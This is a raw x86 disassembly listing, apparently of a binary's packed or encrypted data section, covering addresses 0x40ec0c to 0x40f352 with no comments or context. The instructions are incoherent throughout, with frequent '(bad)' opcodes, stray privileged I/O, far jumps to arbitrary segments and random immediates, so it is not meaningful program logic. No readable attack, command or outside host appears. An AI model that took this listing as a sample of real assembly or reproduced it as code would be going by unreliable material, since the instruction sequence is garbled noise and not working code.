  40ec0c:	leave  
  40ec0d:	repz retf 0x2609
  40ec11:	sbb    edx,edx
  40ec13:	int    0x34
  40ec15:	fisttp DWORD PTR [eax-0x223c2c47]
  40ec1b:	pop    edi
  40ec1c:	cmp    eax,0xe36be704
  40ec21:	push   ss
  40ec22:	lds    ecx,FWORD PTR [edi-0x5743a578]
  40ec28:	push   ebp
  40ec29:	cmc    
  40ec2a:	aaa    
  40ec2b:	jmp    0x2fc4:0xe0c4b748
  40ec32:	(bad)  
  40ec33:	cmp    al,0x8c
  40ec35:	scas   eax,DWORD PTR es:[edi]
  40ec36:	pusha  
  40ec37:	aas    
  40ec38:	mov    ebp,0xac7495e4
  40ec3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec3e:	daa    
  40ec3f:	mov    al,ds:0xcabbe7df
  40ec44:	ins    BYTE PTR es:[edi],dx
  40ec45:	cdq    
  40ec46:	push   cs
  40ec47:	addr16 aad 0x97
  40ec4a:	stc    
  40ec4b:	inc    ebp
  40ec4c:	scas   al,BYTE PTR es:[edi]
  40ec4d:	into   
  40ec4e:	int    0x1c
  40ec50:	mov    ch,0xd
  40ec52:	cmc    
  40ec53:	loopne 0x40ec45
  40ec55:	cmp    al,0x7e
  40ec57:	pushf  
  40ec58:	adc    DWORD PTR [edi-0x58bd182f],ebp
  40ec5e:	test   al,0x6e
  40ec60:	sbb    al,0xb4
  40ec62:	(bad)  
  40ec63:	loopne 0x40ec23
  40ec65:	xor    DWORD PTR [esi],esp
  40ec67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec68:	jge    0x40ec8b
  40ec6a:	dec    esi
  40ec6b:	repz fdivp st(4),st
  40ec6e:	xchg   edi,eax
  40ec6f:	popf   
  40ec70:	xchg   DWORD PTR [ecx+ebx*4],ecx
  40ec73:	adc    edi,DWORD PTR [ebx-0x69]
  40ec76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec77:	cli    
  40ec78:	mov    ds:0xc48b1aad,al
  40ec7d:	enter  0xf3b3,0x40
  40ec81:	cmp    al,0xdd
  40ec83:	stc    
  40ec84:	sub    al,0xf8
  40ec86:	jmp    0x7d40f990
  40ec8b:	inc    esp
  40ec8c:	mov    bl,0x40
  40ec8e:	ror    ah,1
  40ec90:	jns    0x40ec38
  40ec92:	mov    dh,BYTE PTR [ebp+0x55]
  40ec95:	mov    eax,ds:0xc19e0824
  40ec9a:	arpl   WORD PTR [edx],di
  40ec9c:	pop    ss
  40ec9d:	adc    edx,DWORD PTR [ebx+esi*4+0x6a278d6e]
  40eca4:	sahf   
  40eca5:	pusha  
  40eca6:	cmc    
  40eca7:	xor    BYTE PTR [edx+0x4e],dh
  40ecaa:	ss enter 0x22a0,0xa2
  40ecaf:	idiv   BYTE PTR [edi+0x1]
  40ecb2:	mov    ch,0xb6
  40ecb4:	and    esi,edi
  40ecb6:	cli    
  40ecb7:	push   0x9f942080
  40ecbc:	loope  0x40ecb7
  40ecbe:	je     0x40ed1a
  40ecc0:	mov    ah,0x48
  40ecc2:	jge    0x40eced
  40ecc4:	mov    ebx,0x518a75b4
  40ecc9:	push   ds
  40ecca:	addr16 (bad) 
  40eccc:	out    dx,al
  40eccd:	fs (bad) 
  40eccf:	cmp    bl,BYTE PTR [edi]
  40ecd1:	jl     0x40ed36
  40ecd3:	scas   eax,DWORD PTR es:[edi]
  40ecd4:	ficomp WORD PTR cs:[ebx+0x1f]
  40ecd8:	mov    al,0x65
  40ecda:	in     eax,dx
  40ecdb:	retf   0x4d01
  40ecde:	fiadd  DWORD PTR [esi-0x56]
  40ece1:	popf   
  40ece2:	inc    edi
  40ece3:	mov    eax,0x2abb361d
  40ece8:	dec    edx
  40ece9:	jmp    0x40ec6e
  40eceb:	jge    0x40ecb2
  40eced:	outs   dx,BYTE PTR ds:[esi]
  40ecee:	cmp    edx,edi
  40ecf0:	fwait
  40ecf1:	cmp    BYTE PTR [ebp+0x4cd2ae2b],0xa2
  40ecf8:	xlat   BYTE PTR ds:[ebx]
  40ecf9:	xor    eax,0xda931147
  40ecfe:	inc    esp
  40ecff:	jp     0x40eca3
  40ed01:	mov    edi,0xea7d8b57
  40ed06:	adc    edi,esi
  40ed08:	push   es
  40ed09:	(bad)  [ecx]
  40ed0b:	cmp    edx,eax
  40ed0d:	loope  0x40ed88
  40ed0f:	scas   al,BYTE PTR es:[edi]
  40ed10:	test   eax,0xedba69e2
  40ed15:	(bad)  
  40ed16:	xor    BYTE PTR [ecx+eax*1],ch
  40ed19:	mov    ah,0x87
  40ed1b:	repz jmp 0x40ed72
  40ed1e:	mul    DWORD PTR [esi]
  40ed20:	sahf   
  40ed21:	mov    ds,WORD PTR [edi-0x6e091d46]
  40ed27:	sub    BYTE PTR [edx-0x1e],cl
  40ed2a:	loop   0x40ece0
  40ed2c:	mov    bl,0xf4
  40ed2e:	es mov ah,0x8f
  40ed31:	dec    ebx
  40ed32:	in     al,dx
  40ed33:	ins    BYTE PTR es:[edi],dx
  40ed34:	fwait
  40ed35:	cmp    DWORD PTR [eax-0x638edc57],esp
  40ed3b:	push   ebp
  40ed3c:	push   ebx
  40ed3d:	and    dh,BYTE PTR [edx+ebp*8-0x57]
  40ed41:	xlat   BYTE PTR ds:[ebx]
  40ed42:	fist   WORD PTR [ebx]
  40ed44:	(bad)  
  40ed45:	add    eax,0x2bff92c0
  40ed4a:	lods   eax,DWORD PTR ds:[esi]
  40ed4b:	fmul   DWORD PTR [ebx-0x5c]
  40ed4e:	lahf   
  40ed4f:	loop   0x40ed9c
  40ed51:	stos   DWORD PTR es:[edi],eax
  40ed52:	add    dl,BYTE PTR [edi]
  40ed54:	test   DWORD PTR [edx-0x63b0ba5f],esp
  40ed5a:	(bad)  
  40ed5b:	mov    ch,0x34
  40ed5d:	add    al,0x10
  40ed5f:	or     eax,eax
  40ed61:	or     al,0x84
  40ed63:	pop    ecx
  40ed64:	cmp    eax,0xda5e6c90
  40ed69:	ss in  al,0x28
  40ed6c:	(bad)  
  40ed6d:	and    eax,0x343951c5
  40ed72:	pop    ebp
  40ed73:	mov    edx,0xc8c3181b
  40ed78:	or     eax,0x763e915e
  40ed7d:	sbb    al,0x9d
  40ed7f:	mov    eax,ds:0xd23cd005
  40ed84:	cmp    al,0xb1
  40ed86:	(bad)  
  40ed87:	pop    eax
  40ed88:	in     al,0x95
  40ed8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed8b:	mov    dh,0x3e
  40ed8d:	pop    ds
  40ed8e:	mov    WORD PTR [ebx],?
  40ed90:	sbb    cl,BYTE PTR [ecx+0x5c]
  40ed93:	dec    esp
  40ed94:	push   esp
  40ed95:	stc    
  40ed96:	dec    ebx
  40ed97:	and    BYTE PTR [edi-0x13e43057],dl
  40ed9d:	xor    dl,0x25
  40eda0:	pop    edi
  40eda1:	jns    0x40ee14
  40eda3:	jmp    0x498c:0x3d45fa09
  40edaa:	push   edi
  40edab:	jmp    0x40edab
  40edad:	cld    
  40edae:	test   DWORD PTR [ecx+0x71],eax
  40edb1:	in     al,dx
  40edb2:	cmp    ecx,ebp
  40edb4:	pop    eax
  40edb5:	leave  
  40edb6:	je     0x40ee33
  40edb8:	add    BYTE PTR [ecx+0x7f],dl
  40edbb:	inc    ebx
  40edbc:	fstp   DWORD PTR [ebp+0x5c]
  40edbf:	aad    0x9
  40edc1:	dec    eax
  40edc2:	(bad)  
  40edc4:	enter  0x2b34,0xd3
  40edc8:	fsub   QWORD PTR [eax]
  40edca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edcb:	test   al,0x39
  40edcd:	cmp    al,0xc
  40edcf:	cs aaa 
  40edd1:	jl     0x40ee33
  40edd3:	out    0xba,eax
  40edd5:	cmp    eax,0x85e3f852
  40edda:	xor    ebx,DWORD PTR [ebp+eiz*2+0x6bc7718f]
  40ede1:	push   ss
  40ede2:	mov    ds,WORD PTR [ebp+0x38]
  40ede5:	xchg   edx,eax
  40ede6:	mov    edi,DWORD PTR [ebp+ebp*2+0x1e]
  40edea:	mov    ecx,0xe848e490
  40edef:	push   es
  40edf0:	pop    ebx
  40edf1:	out    dx,al
  40edf2:	and    esp,ebx
  40edf4:	es cli 
  40edf6:	stos   DWORD PTR es:[edi],eax
  40edf7:	cmc    
  40edf8:	mov    cl,0x9b
  40edfa:	mov    dl,bh
  40edfc:	mov    bh,0xf4
  40edfe:	xor    esi,0x3f57a1ac
  40ee04:	sbb    BYTE PTR [ecx-0xc0e12e4],0xe5
  40ee0b:	(bad)  
  40ee0c:	add    al,0x5
  40ee0e:	inc    ebx
  40ee0f:	jecxz  0x40edf7
  40ee11:	test   al,0x9e
  40ee13:	arpl   bx,si
  40ee15:	dec    edi
  40ee16:	imul   edx,DWORD PTR [ebx-0x42],0x60c83e79
  40ee1d:	cld    
  40ee1e:	pop    ebx
  40ee1f:	xchg   ecx,eax
  40ee20:	out    dx,al
  40ee21:	mov    al,0x5e
  40ee23:	(bad)  
  40ee25:	jge    0x40edfd
  40ee27:	mov    ds:0x5a18ea62,al
  40ee2c:	mov    eax,ds:0x72445414
  40ee31:	das    
  40ee32:	cdq    
  40ee33:	imul   DWORD PTR [edi-0xd]
  40ee36:	imul   ebx,DWORD PTR gs:[esi],0x46
  40ee3a:	dec    ecx
  40ee3b:	je     0x40edc3
  40ee3d:	gs test al,0x3d
  40ee40:	push   eax
  40ee41:	ret    0x90bd
  40ee44:	shl    BYTE PTR [ebp+0x7e968e98],0x8
  40ee4b:	sub    DWORD PTR [eax],ebx
  40ee4d:	les    eax,FWORD PTR ds:0xcf8c2eb1
  40ee53:	xchg   esp,eax
  40ee54:	pop    ebp
  40ee55:	xor    eax,0x5ad98a2d
  40ee5a:	xor    eax,0x6274a976
  40ee5f:	loopne 0x40ee33
  40ee61:	pusha  
  40ee62:	outs   dx,DWORD PTR ds:[esi]
  40ee63:	loop   0x40ee91
  40ee65:	outs   dx,DWORD PTR ds:[esi]
  40ee66:	mov    esp,0x1ffeb403
  40ee6b:	scas   eax,DWORD PTR es:[edi]
  40ee6c:	test   al,0xd1
  40ee6e:	push   es
  40ee6f:	das    
  40ee70:	sbb    al,0xe2
  40ee72:	sbb    DWORD PTR [esi+0x26a96655],esi
  40ee78:	(bad)  
  40ee7a:	inc    ecx
  40ee7b:	loopne 0x40eeaf
  40ee7d:	repz cmp BYTE PTR [ecx-0x77],bl
  40ee81:	xchg   DWORD PTR ds:0x2e40917d,edx
  40ee87:	das    
  40ee88:	mov    eax,ds:0x46fcc11c
  40ee8d:	mov    ch,0xc2
  40ee8f:	adc    al,0x15
  40ee91:	cmp    dl,bh
  40ee93:	mov    ebp,0xd324b3a6
  40ee98:	arpl   WORD PTR [ecx],bp
  40ee9a:	aam    0xc0
  40ee9c:	cmp    ah,BYTE PTR [eax]
  40ee9e:	xchg   edx,eax
  40ee9f:	jl     0x40eeca
  40eea1:	sub    eax,0xe55e39c7
  40eea6:	pop    esp
  40eea7:	jne    0x40ef20
  40eea9:	test   DWORD PTR [eax],0x4b5cc5b6
  40eeaf:	mov    edi,0x91902f72
  40eeb4:	add    bh,BYTE PTR [ebp-0x7917c7d5]
  40eeba:	popa   
  40eebb:	xchg   DWORD PTR [eax-0x5338214e],eax
  40eec1:	lods   eax,DWORD PTR cs:[esi]
  40eec3:	inc    ebx
  40eec4:	or     BYTE PTR [ebx-0x3f],dl
  40eec7:	inc    ebp
  40eec8:	lods   eax,DWORD PTR ds:[esi]
  40eec9:	jmp    FWORD PTR [esi+eiz*4-0x42]
  40eecd:	cmp    edx,edx
  40eecf:	jg     0x40eefd
  40eed1:	lods   eax,DWORD PTR ds:[esi]
  40eed2:	cwde   
  40eed3:	adc    bl,bh
  40eed5:	mov    esp,0xaad78188
  40eeda:	jge    0x40ee61
  40eedc:	and    al,0x97
  40eede:	in     al,dx
  40eedf:	push   eax
  40eee0:	and    eax,0x9097125a
  40eee5:	pop    ds
  40eee6:	inc    ebx
  40eee7:	retf   0xb934
  40eeea:	and    BYTE PTR [edx+edx*4+0x483e2918],0x3f
  40eef2:	jmp    0x9fe4:0xa2989600
  40eef9:	dec    esp
  40eefa:	jp     0x40ef41
  40eefc:	daa    
  40eefd:	adc    eax,ebp
  40eeff:	mov    edi,0x3daa0360
  40ef04:	fstp   TBYTE PTR [ecx-0x3a5b6f24]
  40ef0a:	cmp    bl,BYTE PTR [esi-0x62]
  40ef0d:	jno    0x40ef0c
  40ef0f:	dec    edx
  40ef10:	cmp    al,0xfd
  40ef12:	sbb    ebp,esi
  40ef14:	lds    eax,FWORD PTR [ebx+esi*2-0x421f5bca]
  40ef1b:	inc    edx
  40ef1c:	add    al,0x74
  40ef1e:	popf   
  40ef1f:	(bad)  
  40ef20:	aam    0xa8
  40ef22:	lods   eax,DWORD PTR ds:[esi]
  40ef23:	je     0x40eefd
  40ef25:	xchg   edi,eax
  40ef26:	dec    ebx
  40ef27:	test   DWORD PTR [edx],ebp
  40ef29:	dec    edi
  40ef2a:	dec    edx
  40ef2b:	or     eax,0x8bc6867e
  40ef30:	dec    ecx
  40ef31:	sbb    al,0xf5
  40ef33:	out    dx,eax
  40ef34:	fnstcw WORD PTR [ebx-0x14]
  40ef37:	pop    ecx
  40ef38:	into   
  40ef39:	neg    DWORD PTR [ecx-0x7c]
  40ef3c:	enter  0xb393,0x62
  40ef40:	or     ebp,0xad7026e3
  40ef46:	std    
  40ef47:	xacquire xchg DWORD PTR [ecx-0x7a],esi
  40ef4b:	dec    edi
  40ef4c:	mov    esp,0x431fba4d
  40ef51:	mov    edx,0xffe64b24
  40ef56:	retf   
  40ef57:	mov    ebp,0x72776428
  40ef5c:	mov    eax,ds:0xfa5cac07
  40ef61:	mov    DWORD PTR [eax-0x7213fe58],esp
  40ef67:	fucom  st(3)
  40ef69:	fist   DWORD PTR [ebx-0x5f69ca18]
  40ef6f:	pop    ecx
  40ef70:	add    BYTE PTR [esi-0x29],cl
  40ef73:	cmp    eax,DWORD PTR [edx-0x26]
  40ef76:	mov    ecx,0xf427db67
  40ef7b:	mov    WORD PTR [esi-0x1e],gs
  40ef7e:	gs cmc 
  40ef80:	jnp    0x40ef2a
  40ef82:	enter  0x731e,0xd5
  40ef86:	es cmp eax,0x64a9bdb1
  40ef8c:	aaa    
  40ef8d:	retf   0xa846
  40ef90:	loopne 0x40ef47
  40ef92:	xor    ah,BYTE PTR [eax+0x0]
  40ef95:	pop    es
  40ef96:	dec    ebx
  40ef97:	inc    ecx
  40ef98:	pop    ebp
  40ef99:	das    
  40ef9a:	mov    ds:0xf2285138,eax
  40ef9f:	sub    al,0x1d
  40efa1:	out    0x2a,al
  40efa3:	mov    ah,0xea
  40efa5:	adc    DWORD PTR [ecx+0x272825c],0x5eef8747
  40efaf:	push   ds
  40efb0:	repz mov al,0x36
  40efb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efb4:	test   BYTE PTR [ecx-0x70105962],dl
  40efba:	add    eax,0x41ad1bf4
  40efbf:	inc    esp
  40efc0:	ja     0x40efb2
  40efc2:	scas   eax,DWORD PTR es:[edi]
  40efc3:	xchg   ecx,eax
  40efc4:	pop    eax
  40efc5:	fidiv  DWORD PTR [edi]
  40efc7:	in     al,0x1
  40efc9:	(bad)  
  40efca:	cmp    DWORD PTR [ebp-0x2505a439],ebp
  40efd0:	lock sub eax,0x2e803cd3
  40efd6:	dec    edi
  40efd7:	addr16 mov ds:0x70f0,al
  40efdb:	stc    
  40efdc:	push   0xffffffb7
  40efde:	pop    esp
  40efdf:	add    ebx,eax
  40efe1:	push   esp
  40efe2:	outs   dx,DWORD PTR ds:[esi]
  40efe3:	mov    cl,0x4c
  40efe5:	(bad)  
  40efe7:	mov    bh,0x3b
  40efe9:	jae    0x40eff8
  40efeb:	mov    DWORD PTR [eax+0x29],eax
  40efee:	mov    edi,esp
  40eff0:	es dec ebx
  40eff2:	out    0xcb,al
  40eff4:	dec    esp
  40eff5:	sbb    eax,0x345962e6
  40effa:	addr16 enter 0xec21,0x5a
  40efff:	xchg   esp,eax
  40f000:	pop    edx
  40f001:	int3   
  40f002:	adc    eax,0x843f9c0d
  40f007:	dec    eax
  40f008:	pop    ds
  40f009:	in     al,0x75
  40f00b:	add    edx,ecx
  40f00d:	cmp    edi,DWORD PTR [edx-0x25]
  40f010:	aam    0xa6
  40f012:	rcl    BYTE PTR [ebx],0xf6
  40f015:	scas   al,BYTE PTR es:[edi]
  40f016:	js     0x40f02e
  40f018:	rcl    DWORD PTR [ebp+0x59e19ba5],1
  40f01e:	pop    es
  40f01f:	mov    al,BYTE PTR [ebx-0xfff2f6a]
  40f025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f026:	cdq    
  40f027:	push   ebx
  40f028:	sbb    BYTE PTR [ebx+0x31],al
  40f02b:	mov    al,0x6
  40f02d:	fadd   QWORD PTR ds:0x414fcbe7
  40f033:	pop    ebp
  40f034:	add    cl,BYTE PTR [esi+0x21aba78b]
  40f03a:	pusha  
  40f03b:	enter  0x288f,0x52
  40f03f:	fbstp  TBYTE PTR [eax+eax*8]
  40f042:	dec    eax
  40f043:	ja     0x40f0b1
  40f045:	repz in al,dx
  40f047:	jne    0x40f08f
  40f049:	jg     0x40f0c4
  40f04b:	cs in  al,dx
  40f04d:	jns    0x40f03b
  40f04f:	pop    esp
  40f050:	call   0xbdcb:0x2dc5fea1
  40f057:	push   eax
  40f058:	or     ebp,esi
  40f05a:	cdq    
  40f05b:	popa   
  40f05c:	in     al,0xe2
  40f05e:	outs   dx,BYTE PTR ds:[esi]
  40f05f:	or     dh,ah
  40f061:	inc    edi
  40f062:	xchg   edi,eax
  40f063:	das    
  40f064:	jae    0x40f01c
  40f066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f067:	stc    
  40f068:	mov    esi,0x42abd97d
  40f06d:	lods   al,BYTE PTR ds:[esi]
  40f06e:	mov    al,0x80
  40f070:	or     DWORD PTR [edx-0x3d194851],edx
  40f076:	arpl   WORD PTR [ecx+eiz*1-0x4706ed85],sp
  40f07d:	ret    0x11a7
  40f080:	repnz pop es
  40f082:	rcr    dh,0xad
  40f085:	lock push esi
  40f087:	push   0x1078eecd
  40f08c:	fild   DWORD PTR [ebx]
  40f08e:	jo     0x40f061
  40f090:	inc    BYTE PTR [esi+0x2c]
  40f093:	mov    esp,0x591d2ac3
  40f098:	fldenv [edi-0x68]
  40f09b:	or     BYTE PTR [edx],bl
  40f09d:	and    al,0x3a
  40f09f:	push   ebx
  40f0a0:	fld    TBYTE PTR [edi+0x24]
  40f0a3:	or     al,0x88
  40f0a5:	jecxz  0x40f070
  40f0a7:	fsub   QWORD PTR ds:0x4d7e4973
  40f0ad:	push   eax
  40f0ae:	stc    
  40f0af:	mov    eax,0xd9a130f1
  40f0b4:	mov    esi,0xb3511c61
  40f0b9:	mov    ebx,0x204d61b9
  40f0be:	bound  ebx,QWORD PTR [edi+0x6076d479]
  40f0c4:	jge    0x40f0cb
  40f0c6:	sbb    esp,DWORD PTR [eax]
  40f0c8:	mov    dl,0xe4
  40f0ca:	stc    
  40f0cb:	lds    ecx,FWORD PTR gs:[ebx-0x4a]
  40f0cf:	data16 in al,dx
  40f0d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d2:	push   esi
  40f0d3:	hlt    
  40f0d4:	inc    eax
  40f0d5:	push   ebx
  40f0d6:	(bad)  
  40f0d8:	stos   BYTE PTR es:[edi],al
  40f0d9:	out    0xb4,eax
  40f0db:	jns    0x40f121
  40f0dd:	push   ecx
  40f0de:	stc    
  40f0df:	pop    edx
  40f0e0:	sbb    eax,0xa24c1340
  40f0e5:	or     BYTE PTR ds:0xd62f373b,0x3a
  40f0ec:	or     ecx,DWORD PTR ds:[ecx+0x71]
  40f0f0:	ja     0x40f163
  40f0f2:	ret    0x659c
  40f0f5:	jecxz  0x40f0e2
  40f0f7:	jle    0x40f14e
  40f0f9:	int3   
  40f0fa:	jl     0x40f123
  40f0fc:	inc    esp
  40f0fd:	stos   DWORD PTR es:[edi],eax
  40f0fe:	js     0x40f0df
  40f100:	mov    edi,0x7c0906ca
  40f105:	ret    
  40f106:	shl    DWORD PTR [ecx+0x6684ef86],1
  40f10c:	xchg   esp,eax
  40f10d:	dec    ebp
  40f10e:	je     0x40f12a
  40f110:	ficom  DWORD PTR [bp+0x22]
  40f114:	and    DWORD PTR [ebx-0x71de08df],ecx
  40f11a:	outs   dx,BYTE PTR ds:[esi]
  40f11b:	cmp    ch,bh
  40f11d:	(bad)  
  40f11e:	stc    
  40f11f:	fs xchg ebp,eax
  40f121:	ror    DWORD PTR [esi],0x24
  40f124:	xchg   edx,eax
  40f125:	jb     0x40f17b
  40f127:	and    edi,DWORD PTR [esi+0x1a]
  40f12a:	call   FWORD PTR [eax-0x3494ac4]
  40f130:	and    edx,esp
  40f132:	stos   DWORD PTR es:[edi],eax
  40f133:	sbb    bl,bh
  40f135:	push   ds
  40f136:	inc    ecx
  40f137:	pop    edx
  40f138:	pop    ds
  40f139:	jl     0x40f1b9
  40f13b:	sbb    edx,DWORD PTR [eax]
  40f13d:	and    eax,0x7c395892
  40f142:	mov    dl,0x67
  40f144:	inc    ebp
  40f145:	add    eax,0x6f944649
  40f14a:	jmp    0xb4fa0e12
  40f14f:	pop    eax
  40f150:	mov    al,0x5a
  40f152:	pop    edx
  40f153:	fwait
  40f154:	pop    ecx
  40f155:	imul   ebp,DWORD PTR [edi+0x7bc9d571],0xafa6fc03
  40f15f:	je     0x40f1bf
  40f161:	clc    
  40f162:	lahf   
  40f163:	sbb    edi,DWORD PTR [esi+0x9]
  40f166:	outs   dx,BYTE PTR ds:[esi]
  40f167:	fisttp DWORD PTR [ecx+0x36]
  40f16a:	fdivr  st(4),st
  40f16c:	(bad)  [edx-0x26d5cde5]
  40f172:	test   BYTE PTR [ebp+0x18],al
  40f175:	sub    BYTE PTR [ebx],al
  40f177:	mov    al,al
  40f179:	loop   0x40f150
  40f17b:	mov    eax,0x8671620
  40f180:	test   DWORD PTR [eax],0xccd0f286
  40f186:	xchg   esi,eax
  40f187:	pop    ss
  40f188:	enter  0x4032,0x76
  40f18c:	inc    esp
  40f18d:	mov    eax,0xc09f197c
  40f192:	add    ebx,DWORD PTR [edx+0x71e69ba]
  40f198:	test   DWORD PTR [edi-0x25fe9adb],ebp
  40f19e:	fs xchg edi,eax
  40f1a0:	push   edi
  40f1a1:	adc    BYTE PTR [ebx+ebp*2+0x4ec6aff5],al
  40f1a8:	int3   
  40f1a9:	(bad)  [ecx-0x41]
  40f1ac:	inc    esi
  40f1ad:	(bad)  
  40f1af:	jmp    0x8b9:0xe228f597
  40f1b6:	or     dl,BYTE PTR [edx]
  40f1b8:	inc    ebx
  40f1b9:	push   ebx
  40f1ba:	and    ch,ah
  40f1bc:	(bad)  
  40f1bd:	and    DWORD PTR [edx+ebp*4-0x1a],eax
  40f1c1:	push   edi
  40f1c2:	cli    
  40f1c3:	(bad)  
  40f1c4:	cwde   
  40f1c5:	pop    edx
  40f1c6:	cld    
  40f1c7:	js     0x40f1a1
  40f1c9:	pop    eax
  40f1ca:	stos   BYTE PTR es:[edi],al
  40f1cb:	mov    WORD PTR [edi+0x11],gs
  40f1ce:	inc    ebx
  40f1cf:	inc    ebp
  40f1d0:	pop    ebx
  40f1d1:	dec    edi
  40f1d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1d3:	dec    eax
  40f1d4:	xchg   esp,eax
  40f1d5:	in     al,0x6
  40f1d7:	add    edx,DWORD PTR [eax]
  40f1d9:	mov    bl,0x8f
  40f1db:	jl     0x40f228
  40f1dd:	jecxz  0x40f1b1
  40f1df:	cld    
  40f1e0:	test   eax,0x54d943c1
  40f1e5:	retf   0x114f
  40f1e8:	das    
  40f1e9:	xor    ch,BYTE PTR [edx+0x1af47ac6]
  40f1ef:	jmp    0x751d1c5f
  40f1f4:	xor    cl,cl
  40f1f6:	iret   
  40f1f7:	in     al,dx
  40f1f8:	xor    DWORD PTR [ecx-0x23ebd2e6],ebp
  40f1fe:	cli    
  40f1ff:	mov    eax,ebp
  40f201:	sbb    eax,0x2208d23
  40f206:	xchg   ebx,eax
  40f207:	cmp    BYTE PTR [edx+0x60],cl
  40f20a:	inc    BYTE PTR [ebx-0x77]
  40f20d:	jp     0x40f1c0
  40f20f:	dec    esi
  40f210:	imul   edi,DWORD PTR [ecx-0x367c715f],0xfffffff5
  40f217:	div    BYTE PTR [ebx-0x45]
  40f21a:	push   es
  40f21b:	aam    0xeb
  40f21d:	outs   dx,BYTE PTR ds:[esi]
  40f21e:	adc    al,ch
  40f220:	(bad)  
  40f222:	packuswb mm4,QWORD PTR [eax-0x24a7b2b4]
  40f229:	fimul  WORD PTR ds:[ebx-0xa]
  40f22d:	mov    ebp,0xca81b46c
  40f232:	mov    bh,0xbc
  40f234:	in     al,0xd4
  40f236:	adc    BYTE PTR [eax-0x2d2b88cc],bh
  40f23c:	frstor [ecx+0x160b1370]
  40f242:	push   esi
  40f243:	nop
  40f244:	rcr    al,0xc5
  40f247:	xchg   ebp,eax
  40f248:	imul   edi,DWORD PTR ss:[ebx],0x52efde37
  40f24f:	js     0x40f216
  40f251:	pop    esp
  40f252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f253:	inc    edi
  40f254:	sub    BYTE PTR [edi],dl
  40f256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f257:	mov    ds,ebp
  40f259:	xor    BYTE PTR [ecx],bh
  40f25b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f25c:	rol    eax,1
  40f25e:	daa    
  40f25f:	je     0x40f1e7
  40f261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f262:	xchg   edi,eax
  40f263:	xor    BYTE PTR ds:0x840bf569,dh
  40f269:	ror    DWORD PTR [ebx-0x13],cl
  40f26c:	pop    ds
  40f26d:	mov    edx,0xad7d9762
  40f272:	(bad)  
  40f273:	outs   dx,DWORD PTR ds:[esi]
  40f274:	mov    eax,0xbb8aea2a
  40f279:	jge    0x40f2e8
  40f27b:	inc    esi
  40f27c:	dec    ebx
  40f27d:	mov    ah,BYTE PTR [ecx+0x24]
  40f280:	lea    edi,[esi-0x34bcb24a]
  40f286:	(bad)  
  40f287:	icebp  
  40f288:	out    0x63,eax
  40f28a:	jns    0x40f23b
  40f28c:	xchg   edx,eax
  40f28d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28e:	inc    ebp
  40f28f:	(bad)  [eax]
  40f291:	(bad)  
  40f293:	xlat   BYTE PTR ds:[ebx]
  40f294:	mov    al,ds:0x7d49dd1d
  40f299:	xor    al,0x77
  40f29b:	repnz iret 
  40f29d:	in     al,0x54
  40f29f:	pop    es
  40f2a0:	fsubrp st(2),st
  40f2a2:	ror    edi,1
  40f2a4:	es out 0xaf,al
  40f2a7:	mov    WORD PTR [eax-0x5e345f10],cs
  40f2ad:	and    al,0x62
  40f2af:	pop    esi
  40f2b0:	push   ebp
  40f2b1:	or     dl,BYTE PTR [ebp-0x5b9e2460]
  40f2b7:	adc    eax,0xc8a97ad6
  40f2bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2bd:	leave  
  40f2be:	mov    ds:0x8ee3c3d,eax
  40f2c3:	aas    
  40f2c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2c5:	fbstp  TBYTE PTR [ebx-0x16]
  40f2c8:	add    DWORD PTR [esi+ecx*1],0x1d
  40f2cc:	jnp    0x40f295
  40f2ce:	int3   
  40f2cf:	in     eax,0x57
  40f2d1:	retf   0xec1d
  40f2d4:	call   0xbb08:0x72e74efb
  40f2db:	or     cl,BYTE PTR [ecx-0x7d]
  40f2de:	or     eax,0xab6128aa
  40f2e3:	loope  0x40f2e7
  40f2e5:	xchg   BYTE PTR [ebx+0x6e],bh
  40f2e8:	sbb    dl,al
  40f2ea:	add    al,0x58
  40f2ec:	sti    
  40f2ed:	pop    ebp
  40f2ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2ef:	(bad)  
  40f2f0:	mov    WORD PTR [edi+0x3a],ss
  40f2f3:	out    dx,eax
  40f2f4:	mov    edx,0xcb5cf573
  40f2f9:	pop    ss
  40f2fa:	pop    ebx
  40f2fb:	mov    edi,0x5f7e584e
  40f300:	add    cl,BYTE PTR [ebx]
  40f302:	push   es
  40f303:	xchg   edx,eax
  40f304:	mov    eax,ds:0xf34681ae
  40f309:	lods   al,BYTE PTR ds:[esi]
  40f30a:	ss lock or eax,0xeef2d48f
  40f311:	sub    DWORD PTR [eax+0x64],ebx
  40f314:	ja     0x40f307
  40f316:	jmp    0x73e9:0x1e9ff0cd
  40f31d:	shl    bl,0xcd
  40f320:	mov    eax,ds:0xf0160016
  40f325:	mov    eax,0xef68af8c
  40f32a:	stos   BYTE PTR es:[edi],al
  40f32b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f32c:	in     al,0xec
  40f32e:	mov    dh,0x46
  40f330:	add    dh,dh
  40f332:	jl     0x40f305
  40f334:	xchg   DWORD PTR [eax+eiz*4-0x1b],edi
  40f338:	out    0xc,eax
  40f33a:	pop    ss
  40f33b:	add    ebx,DWORD PTR [esi-0x4d7f204]
  40f341:	fild   WORD PTR [ecx+0x6f]
  40f344:	xchg   ecx,eax
  40f345:	in     al,0x73
  40f347:	(bad)  
  40f348:	(bad)  
  40f349:	and    ebx,esp
  40f34b:	push   es
  40f34c:	aad    0xd8
  40f34e:	xchg   edx,eax
  40f34f:	inc    edi
  40f350:	sub    al,0x78
  40f352:	das    
